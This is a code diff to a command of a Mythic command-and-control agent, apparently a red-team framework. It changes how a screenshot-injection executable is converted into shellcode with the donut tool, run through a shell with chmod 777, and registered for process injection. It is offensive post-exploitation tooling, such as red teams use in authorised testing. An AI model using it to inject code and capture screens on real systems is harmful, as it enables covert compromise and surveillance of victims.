@@ -48,21 +48,31 @@ class ScreenshotInjectCommand(CommandBase):
         exePath = "/srv/ScreenshotInject.exe"
         if not path.exists(exePath):
             raise Exception("Could not find {}".format(exePath))
+        donutPath = "/Mythic/agent_code/donut"
+        if not path.exists(donutPath):
+            raise Exception("Could not find {}".format(donutPath))
+        command = "chmod 777 {}; chmod +x {}".format(donutPath, donutPath)
+        proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr= asyncio.subprocess.PIPE)
+        stdout, stderr = await proc.communicate()
         
-        donutPic = donut.create(file=exePath, params=task.args.get_arg("pipe_name"))
-        if donutPic is None:
-            raise Exception("Failed to create shellcode")
+        command = "{} -f 1 -p \"{}\" {}".format(donutPath, task.args.get_arg("pipe_name"), exePath)
         # need to go through one more step to turn our exe into shellcode
-        file_resp = await MythicRPC().execute(
-            "create_file",
-            task_id=task.id,
-            file=base64.b64encode(donutPic).decode(),
-            delete_after_fetch=True,
-        )
-        if file_resp.status == MythicStatus.Success:
+        proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
+                                        stderr=asyncio.subprocess.PIPE, cwd="/tmp/")
+        stdout, stderr = await proc.communicate()
+        if os.path.exists("/tmp/loader.bin"):
+            file_resp = await MythicRPC().execute(
+                "create_file",
+                task_id=task.id,
+                file=base64.b64encode(open("/tmp/loader.bin", 'rb').read()).decode(),
+                delete_after_fetch=True,
+            )
+            if file_resp.status == MythicStatus.Success:
                 task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
+            else:
+                raise Exception("Failed to register screenshot assembly: " + file_resp.error)
         else:
-            raise Exception("Failed to register screenshot assembly: " + file_resp.error)
+            raise Exception("Failed to find loader.bin")
         return task
 
     async def process_response(self, response: AgentResponse):
